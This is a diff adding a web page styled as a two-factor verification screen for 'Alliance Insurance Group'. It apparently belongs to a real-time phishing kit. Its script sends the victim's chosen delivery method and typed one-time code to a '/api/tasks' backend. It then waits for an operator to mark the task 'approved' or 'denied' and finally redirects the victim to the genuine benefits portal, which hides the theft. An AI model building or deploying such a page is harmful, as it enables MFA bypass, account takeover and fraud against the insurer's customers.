@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verification | Alliance Insurance Group</title>
+<link rel="icon" type="image/jpeg" href="/assets/logo-aig.jpeg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="css/styles.css">
+<style>
+/* ================================================================
+   VERIFY PAGE
+   ================================================================ */
+
+/* -- Layout -- */
+.verify-wrap{
+  max-width:540px;
+  margin:40px 0 80px 176px;
+  padding:0 40px;
+  width:100%;
+}
+.v-form-area{max-width:420px}
+
+/* -- Lock icon -- */
+.v-lock{text-align:center;margin-bottom:10px}
+.v-lock svg{
+  width:44px;height:44px;
+  color:#5a5a5a;stroke-width:1.4;
+  display:inline-block;
+}
+
+/* -- Text -- */
+.v-desc{
+  color:#6a6a6a;font-size:13px;line-height:1.6;
+  margin:0 0 24px;text-align:center;
+}
+.v-note{
+  color:#850025;font-size:12px;font-weight:600;
+  margin:0 0 20px;
+}
+
+/* -- Labels -- */
+.v-label{display:block;color:#555;margin-bottom:5px;font-size:13px}
+
+/* -- Inputs -- */
+.v-input{
+  width:100%;border:1px solid #444;background:#fff;
+  padding:9px 10px;font-size:13px;outline:none;
+  font-family:inherit;color:#4a4a4a;box-sizing:border-box;
+}
+.v-input:focus{border-color:#000}
+.v-input[readonly]{background:#f5f5f5;color:#666;cursor:default}
+
+/* -- Field spacing -- */
+.v-field{margin-bottom:20px}
+
+/* -- Custom Dropdown -- */
+.v-dropdown{position:relative;width:100%}
+.v-dropdown-trigger{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:9px 10px;border:1px solid #444;background:#fff;
+  cursor:pointer;font-size:13px;font-family:inherit;color:#4a4a4a;
+  outline:none;user-select:none;
+}
+.v-dropdown-trigger:focus{border-color:#000}
+.v-dropdown-trigger svg{
+  width:14px;height:14px;color:#666;
+  transition:transform .2s;flex-shrink:0;
+}
+.v-dropdown.open .v-dropdown-trigger svg{transform:rotate(180deg)}
+.v-dropdown-menu{
+  position:absolute;top:100%;left:0;right:0;
+  background:#fff;border:1px solid #444;border-top:none;
+  z-index:10;display:none;
+}
+.v-dropdown.open .v-dropdown-menu{display:block}
+.v-dropdown-option{
+  padding:9px 10px;cursor:pointer;
+  font-size:13px;color:#4a4a4a;
+}
+.v-dropdown-option:hover{background:#f0f0f0}
+.v-dropdown-option.selected{background:#e8e8e8;font-weight:600}
+
+/* -- Buttons -- */
+.v-actions{display:flex;gap:10px;margin:24px 0 0;flex-wrap:wrap}
+.v-btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:10px 20px;border:none;color:#fff;
+  text-transform:uppercase;letter-spacing:.5px;
+  font-size:12px;font-weight:600;cursor:pointer;
+  font-family:inherit;text-decoration:none;white-space:nowrap;
+}
+.v-btn svg{width:16px;height:16px;flex-shrink:0}
+.v-btn-maroon{background:#850025}
+.v-btn-maroon:hover{background:#70001e}
+.v-btn-grey{background:#757575}
+.v-btn-grey:hover{background:#666}
+.v-btn-blue{background:#336699}
+.v-btn-blue:hover{background:#2a5580}
+.v-btn:disabled{opacity:.5;cursor:default;pointer-events:none}
+
+/* -- Loader -- */
+.v-loader{display:flex;align-items:center;gap:12px;margin:20px 0 0}
+.v-loader span{color:#888;font-size:13px}
+.v-spinner{
+  width:20px;height:20px;
+  border:2.5px solid #ddd;border-top-color:#850025;
+  border-radius:50%;
+  animation:v-spin .8s linear infinite;
+  flex-shrink:0;
+}
+.v-spinner-lg{width:36px;height:36px;border-width:3px}
+@keyframes v-spin{to{transform:rotate(360deg)}}
+.v-center{display:flex;justify-content:center;padding:20px 0}
+
+/* -- Info box -- */
+.v-info{
+  display:flex;gap:12px;align-items:flex-start;
+  margin:28px 0 0;padding:14px 16px;
+  background:#fffde7;border:1px solid #e8d44d;border-radius:3px;
+}
+.v-info-icon{
+  width:22px;height:22px;min-width:22px;
+  background:#e8d44d;color:#fff;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:13px;font-weight:700;font-style:italic;
+  line-height:1;
+}
+.v-info p{color:#6a6a6a;font-size:12px;line-height:1.55;margin:0}
+
+/* -- Error box -- */
+.v-error{
+  margin:16px 0 0;padding:10px 14px;
+  background:#fdf2f2;border:1px solid #f0d0d0;border-radius:3px;
+  color:#9a3030;font-size:12.5px;line-height:1.5;
+}
+
+/* -- Redirect (step 3) -- */
+.v-redirect{
+  display:flex;flex-direction:column;align-items:center;
+  justify-content:center;padding:80px 20px;text-align:center;
+}
+.v-redirect p{margin-top:24px;color:#4a4a4a;font-size:15px;font-weight:600}
+
+/* -- Step visibility -- */
+.v-step{display:none}
+.v-step.active{display:block}
+
+/* -- Header overrides -- */
+.site-header{border-bottom:3px solid #e2e2e2}
+.site-header .logo img{height:50px}
+
+/* ================================================================
+   RESPONSIVE
+   ================================================================ */
+@media(max-width:900px){
+  .verify-wrap{
+    margin:30px auto 60px;
+    max-width:100%;padding:0 20px;
+  }
+}
+
+@media(max-width:600px){
+  .verify-wrap{margin:24px auto 50px;padding:0 16px}
+  .v-form-area{max-width:100%}
+  .v-desc{font-size:12.5px}
+  .v-lock svg{width:36px;height:36px}
+  .v-actions{flex-direction:column}
+  .v-btn{width:100%;justify-content:center;padding:10px 20px}
+  .v-input{font-size:14px;padding:10px}
+  .v-dropdown-trigger{font-size:14px;padding:10px}
+  .v-dropdown-option{font-size:14px;padding:10px}
+  .site-header .logo img{height:40px}
+}
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <a class="logo" href="index.html"><img src="/assets/logo-aig.jpeg" alt="Alliance Insurance Group - Employee Benefit Consultants"></a>
+
+  <div class="contact">
+    <div>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="7" y="2" width="10" height="20" rx="2"/><line x1="11" y1="18.3" x2="13" y2="18.3"/></svg>
+      <span>866-396-3967</span>
+    </div>
+    <div>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="2.5" y="4.5" width="19" height="15" rx="1.5"/><path d="M3.5 6l8.5 6.5L20.5 6"/></svg>
+      <span>fsa@allianceinsgroup.com</span>
+    </div>
+  </div>
+
+  <span class="page-title">Verification</span>
+</header>
+
+<main>
+  <div class="verify-wrap">
+
+    <!-- Loading state -->
+    <div class="v-step active" id="stepLoading">
+      <div class="v-lock">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="10.5" width="14" height="10.5" rx="1.5"/><path d="M8 10.5V7a4 4 0 0 1 8 0v3.5"/><circle cx="12" cy="14.7" r="1.3"/><line x1="12" y1="15.8" x2="12" y2="18.2"/></svg>
+      </div>
+      <div class="v-center"><div class="v-spinner"></div></div>
+    </div>
+
+    <!-- Fatal error -->
+    <div class="v-step" id="stepError">
+      <div class="v-lock">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="10.5" width="14" height="10.5" rx="1.5"/><path d="M8 10.5V7a4 4 0 0 1 8 0v3.5"/><circle cx="12" cy="14.7" r="1.3"/><line x1="12" y1="15.8" x2="12" y2="18.2"/></svg>
+      </div>
+      <div class="v-error" id="fatalError"></div>
+    </div>
+
+    <!-- Step 1: Choose Method -->
+    <div class="v-step" id="step1">
+      <div class="v-lock">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="10.5" width="14" height="10.5" rx="1.5"/><path d="M8 10.5V7a4 4 0 0 1 8 0v3.5"/><circle cx="12" cy="14.7" r="1.3"/><line x1="12" y1="15.8" x2="12" y2="18.2"/></svg>
+      </div>
+      <p class="v-desc">Protecting your information is our first priority. In order to access this site or perform this specific function you must receive a confirmation code to the device of your choice. You will be asked to enter the code on the next screen.</p>
+
+      <div class="v-form-area">
+        <div class="v-field">
+          <label class="v-label">Select Delivery Method</label>
+          <div class="v-dropdown" id="methodDropdown">
+            <div class="v-dropdown-trigger" id="methodTrigger" tabindex="0" role="combobox" aria-expanded="false" aria-haspopup="listbox">
+              <span id="methodLabel">Email</span>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
+            </div>
+            <div class="v-dropdown-menu" id="methodMenu" role="listbox">
+              <div class="v-dropdown-option selected" data-value="email" role="option">Email</div>
+              <div class="v-dropdown-option" data-value="phone" role="option">Phone (SMS)</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="v-field">
+          <label class="v-label">Confirmation will be sent to</label>
+          <input type="text" class="v-input" id="maskedInput" readonly tabindex="-1">
+        </div>
+
+        <div class="v-actions" id="step1Actions">
+          <button class="v-btn v-btn-grey" id="cancelBtn1" type="button">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg>
+            <span>Cancel</span>
+          </button>
+          <button class="v-btn v-btn-maroon" id="generateBtn" type="button">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="12" x2="19" y2="12"/><path d="M13 6l6 6-6 6"/></svg>
+            <span id="generateText">Generate Code</span>
+          </button>
+        </div>
+
+        <div class="v-loader" id="step1Loader" style="display:none">
+          <div class="v-spinner"></div>
+          <span>Waiting for verification&hellip;</span>
+        </div>
+
+        <div class="v-error" id="step1Error" style="display:none"></div>
+
+        <div class="v-info">
+          <div class="v-info-icon">i</div>
+          <p>If you do not receive a verification code, please wait 60 seconds before requesting a new one. Contact support at 866-396-3967 if you continue to experience issues.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 2: Enter Code -->
+    <div class="v-step" id="step2">
+      <div class="v-lock">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="10.5" width="14" height="10.5" rx="1.5"/><path d="M8 10.5V7a4 4 0 0 1 8 0v3.5"/><circle cx="12" cy="14.7" r="1.3"/><line x1="12" y1="15.8" x2="12" y2="18.2"/></svg>
+      </div>
+      <p class="v-desc" id="step2Desc"></p>
+      <p class="v-note">Do not share your verification code with anyone else.</p>
+
+      <div class="v-form-area">
+        <div class="v-field">
+          <label class="v-label">Verification Code</label>
+          <input type="text" class="v-input" id="codeInput" autocomplete="one-time-code" placeholder="Enter code">
+        </div>
+
+        <div class="v-actions" id="step2Actions">
+          <button class="v-btn v-btn-maroon" id="continueBtn" type="button">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5L20 6.5"/></svg>
+            <span>Continue</span>
+          </button>
+          <button class="v-btn v-btn-grey" id="cancelBtn2" type="button">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg>
+            <span>Cancel</span>
+          </button>
+          <button class="v-btn v-btn-blue" id="resendBtn" type="button">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 4v6h6"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
+            <span id="resendText">Resend Code</span>
+          </button>
+        </div>
+
+        <div class="v-loader" id="step2Loader" style="display:none">
+          <div class="v-spinner"></div>
+          <span>Verifying code&hellip;</span>
+        </div>
+
+        <div class="v-error" id="step2Error" style="display:none"></div>
+      </div>
+    </div>
+
+    <!-- Step 3: Redirecting -->
+    <div class="v-step" id="step3">
+      <div class="v-redirect">
+        <div class="v-spinner v-spinner-lg"></div>
+        <p>Verification successful. Redirecting you now&hellip;</p>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer class="site-footer">
+  <nav>
+    <a href="#">About Us</a>
+    <a href="#">Terms of Use</a>
+    <a href="#">Privacy Policy</a>
+  </nav>
+  <div class="copy">&copy; Alliance Insurance Group 2018. All Rights Reserved.</div>
+  <div class="sitemap"><a href="#">Site Map</a></div>
+</footer>
+
+<script>
+(function () {
+  /* ---- State ---- */
+  var params = new URLSearchParams(window.location.search);
+  var taskId = params.get('task');
+  var task = null;
+  var selectedMethod = 'email';
+  var activePoll = null;
+  var pollTimeout = null;
+  var cooldownEnd = 0;
+  var cooldownInterval = null;
+
+  /* ---- Elements ---- */
+  var stepLoading  = document.getElementById('stepLoading');
+  var stepError    = document.getElementById('stepError');
+  var step1        = document.getElementById('step1');
+  var step2        = document.getElementById('step2');
+  var step3        = document.getElementById('step3');
+  var fatalError   = document.getElementById('fatalError');
+
+  /* Step 1 */
+  var methodDropdown = document.getElementById('methodDropdown');
+  var methodTrigger  = document.getElementById('methodTrigger');
+  var methodMenu     = document.getElementById('methodMenu');
+  var methodLabel    = document.getElementById('methodLabel');
+  var maskedInput    = document.getElementById('maskedInput');
+  var generateBtn    = document.getElementById('generateBtn');
+  var generateText   = document.getElementById('generateText');
+  var cancelBtn1     = document.getElementById('cancelBtn1');
+  var step1Actions   = document.getElementById('step1Actions');
+  var step1Loader    = document.getElementById('step1Loader');
+  var step1Error     = document.getElementById('step1Error');
+
+  /* Step 2 */
+  var step2Desc    = document.getElementById('step2Desc');
+  var codeInput    = document.getElementById('codeInput');
+  var continueBtn  = document.getElementById('continueBtn');
+  var cancelBtn2   = document.getElementById('cancelBtn2');
+  var resendBtn    = document.getElementById('resendBtn');
+  var resendText   = document.getElementById('resendText');
+  var step2Actions = document.getElementById('step2Actions');
+  var step2Loader  = document.getElementById('step2Loader');
+  var step2Error   = document.getElementById('step2Error');
+
+  /* ---- Init ---- */
+  if (!taskId) {
+    showFatalError('No verification task specified. Please return to the login page and try again.');
+    return;
+  }
+  loadTask();
+
+  /* ============================================================
+     API
+     ============================================================ */
+  async function loadTask() {
+    try {
+      var res = await fetch('/api/tasks/' + taskId);
+      var data = await res.json();
+      if (!res.ok) throw new Error(data.error || 'Task not found');
+      task = data.task;
+
+      if (task.flow_step === 'enter_code' || task.flow_step === 'code_verify') {
+        selectedMethod = task.code_delivery_method || 'email';
+        updateStep2Desc();
+        showStep('step2');
+        codeInput.focus();
+      } else {
+        updateMaskedDisplay();
+        showStep('step1');
+      }
+    } catch (err) {
+      showFatalError(err.message || 'Unable to load verification task. Please try again.');
+    }
+  }
+
+  /* ============================================================
+     Step Management
+     ============================================================ */
+  function showStep(id) {
+    var steps = [stepLoading, stepError, step1, step2, step3];
+    for (var i = 0; i < steps.length; i++) {
+      steps[i].classList.remove('active');
+    }
+    document.getElementById(id).classList.add('active');
+  }
+
+  function showFatalError(msg) {
+    fatalError.textContent = msg;
+    showStep('stepError');
+  }
+
+  /* ============================================================
+     Custom Dropdown
+     ============================================================ */
+  methodTrigger.addEventListener('click', function () {
+    methodDropdown.classList.toggle('open');
+    methodTrigger.setAttribute('aria-expanded', methodDropdown.classList.contains('open'));
+  });
+
+  methodTrigger.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      methodDropdown.classList.toggle('open');
+      methodTrigger.setAttribute('aria-expanded', methodDropdown.classList.contains('open'));
+    } else if (e.key === 'Escape') {
+      methodDropdown.classList.remove('open');
+      methodTrigger.setAttribute('aria-expanded', 'false');
+    }
+  });
+
+  var options = methodMenu.querySelectorAll('.v-dropdown-option');
+  for (var i = 0; i < options.length; i++) {
+    (function (opt) {
+      opt.addEventListener('click', function () {
+        for (var j = 0; j < options.length; j++) {
+          options[j].classList.remove('selected');
+        }
+        opt.classList.add('selected');
+        selectedMethod = opt.getAttribute('data-value');
+        methodLabel.textContent = opt.textContent;
+        methodDropdown.classList.remove('open');
+        methodTrigger.setAttribute('aria-expanded', 'false');
+        updateMaskedDisplay();
+      });
+    })(options[i]);
+  }
+
+  document.addEventListener('click', function (e) {
+    if (!methodDropdown.contains(e.target)) {
+      methodDropdown.classList.remove('open');
+      methodTrigger.setAttribute('aria-expanded', 'false');
+    }
+  });
+
+  /* ============================================================
+     Step 1: Choose Method
+     ============================================================ */
+  function updateMaskedDisplay() {
+    if (!task) return;
+    maskedInput.value = selectedMethod === 'email'
+      ? (task.masked_email || '')
+      : '********';
+  }
+
+  cancelBtn1.addEventListener('click', function () {
+    cleanup();
+    window.location.href = '/login.html';
+  });
+
+  generateBtn.addEventListener('click', async function () {
+    if (generateBtn.disabled) return;
+
+    step1Error.style.display = 'none';
+    step1Loader.style.display = 'flex';
+    step1Actions.style.display = 'none';
+    methodTrigger.style.pointerEvents = 'none';
+    methodTrigger.style.opacity = '0.6';
+
+    try {
+      var res = await fetch('/api/tasks/' + taskId, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          advance_to: 'code_request',
+          code_delivery_method: selectedMethod
+        })
+      });
+
+      var data = await res.json();
+      if (!res.ok) throw new Error(data.error || 'Unable to generate code.');
+      if (data.task) task = data.task;
+
+      startCooldown();
+
+      startPoll(function () {
+        resetStep1UI();
+        updateStep2Desc();
+        showStep('step2');
+        codeInput.value = '';
+        codeInput.disabled = false;
+        codeInput.focus();
+      }, function (msg) {
+        showStep1Error(msg || 'Verification was denied. Please try again.');
+        resetStep1UI();
+      });
+
+    } catch (err) {
+      showStep1Error(err.message || 'Unable to generate code. Please try again.');
+      resetStep1UI();
+    }
+  });
+
+  function resetStep1UI() {
+    step1Loader.style.display = 'none';
+    step1Actions.style.display = 'flex';
+    methodTrigger.style.pointerEvents = '';
+    methodTrigger.style.opacity = '';
+  }
+
+  function showStep1Error(msg) {
+    step1Error.textContent = msg;
+    step1Error.style.display = 'block';
+  }
+
+  /* ============================================================
+     Step 2: Enter Code
+     ============================================================ */
+  function updateStep2Desc() {
+    if (!task) return;
+    var label = selectedMethod === 'email' ? 'e-mail' : 'SMS';
+    var masked = selectedMethod === 'email'
+      ? (task.masked_email || '')
+      : '********';
+    step2Desc.textContent = 'An ' + label + ' has been sent to ' + masked + '. Enter the verification code below:';
+  }
+
+  cancelBtn2.addEventListener('click', function () {
+    cleanup();
+    window.location.href = '/login.html';
+  });
+
+  continueBtn.addEventListener('click', async function () {
+    var code = codeInput.value.trim();
+    if (!code) {
+      showStep2Error('Please enter the verification code.');
+      return;
+    }
+
+    step2Error.style.display = 'none';
+    step2Loader.style.display = 'flex';
+    step2Actions.style.display = 'none';
+    codeInput.disabled = true;
+
+    try {
+      var res = await fetch('/api/tasks/' + taskId, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          advance_to: 'code_verify',
+          verification_code: code
+        })
+      });
+
+      var data = await res.json();
+      if (!res.ok) throw new Error(data.error || 'Unable to verify code.');
+      if (data.task) task = data.task;
+
+      startPoll(function () {
+        showStep('step3');
+        startRedirectCountdown();
+      }, function (msg) {
+        showStep2Error(msg || 'Verification was denied. Please try again.');
+        resetStep2UI();
+      });
+
+    } catch (err) {
+      showStep2Error(err.message || 'Unable to verify code. Please try again.');
+      resetStep2UI();
+    }
+  });
+
+  resendBtn.addEventListener('click', function () {
+    if (resendBtn.disabled) return;
+    stopPoll();
+    step2Error.style.display = 'none';
+    step1Error.style.display = 'none';
+    codeInput.value = '';
+    codeInput.disabled = false;
+    resetStep2UI();
+    showStep('step1');
+    updateMaskedDisplay();
+    resetStep1UI();
+  });
+
+  function resetStep2UI() {
+    step2Loader.style.display = 'none';
+    step2Actions.style.display = 'flex';
+    codeInput.disabled = false;
+  }
+
+  function showStep2Error(msg) {
+    step2Error.textContent = msg;
+    step2Error.style.display = 'block';
+  }
+
+  /* ============================================================
+     Cooldown (shared between steps)
+     ============================================================ */
+  function startCooldown() {
+    cooldownEnd = Date.now() + 60000;
+    updateCooldownUI();
+    clearInterval(cooldownInterval);
+    cooldownInterval = setInterval(function () {
+      updateCooldownUI();
+      if (Date.now() >= cooldownEnd) {
+        clearInterval(cooldownInterval);
+        cooldownInterval = null;
+      }
+    }, 1000);
+  }
+
+  function updateCooldownUI() {
+    var remaining = Math.max(0, Math.ceil((cooldownEnd - Date.now()) / 1000));
+    if (remaining > 0) {
+      generateBtn.disabled = true;
+      generateText.textContent = 'Generate Code (' + remaining + 's)';
+      resendBtn.disabled = true;
+      resendText.textContent = 'Resend Code (' + remaining + 's)';
+    } else {
+      generateBtn.disabled = false;
+      generateText.textContent = 'Generate Code';
+      resendBtn.disabled = false;
+      resendText.textContent = 'Resend Code';
+    }
+  }
+
+  /* ============================================================
+     Polling
+     ============================================================ */
+  function startPoll(onApproved, onDenied) {
+    stopPoll();
+
+    activePoll = setInterval(async function () {
+      try {
+        var res = await fetch('/api/tasks/' + taskId);
+        var data = await res.json();
+        if (!res.ok) return;
+        if (data.task) task = data.task;
+
+        if (task.status === 'approved') {
+          stopPoll();
+          onApproved();
+        } else if (task.status === 'denied') {
+          stopPoll();
+          onDenied('Your request was denied.');
+        }
+      } catch (err) {
+        /* silent retry */
+      }
+    }, 3000);
+
+    pollTimeout = setTimeout(function () {
+      stopPoll();
+      onDenied('Request timed out. Please try again.');
+    }, 150000);
+  }
+
+  function stopPoll() {
+    if (activePoll) { clearInterval(activePoll); activePoll = null; }
+    if (pollTimeout) { clearTimeout(pollTimeout); pollTimeout = null; }
+  }
+
+  /* ============================================================
+     Redirect (Step 3)
+     ============================================================ */
+  function startRedirectCountdown() {
+    var count = 7;
+    var timer = setInterval(function () {
+      count--;
+      if (count <= 0) {
+        clearInterval(timer);
+        window.location.href = 'https://aig.wealthcareportal.com/Page/Home';
+      }
+    }, 1000);
+  }
+
+  /* ============================================================
+     Cleanup
+     ============================================================ */
+  function cleanup() {
+    stopPoll();
+    if (cooldownInterval) { clearInterval(cooldownInterval); cooldownInterval = null; }
+  }
+})();
+</script>
+</body>
+</html>
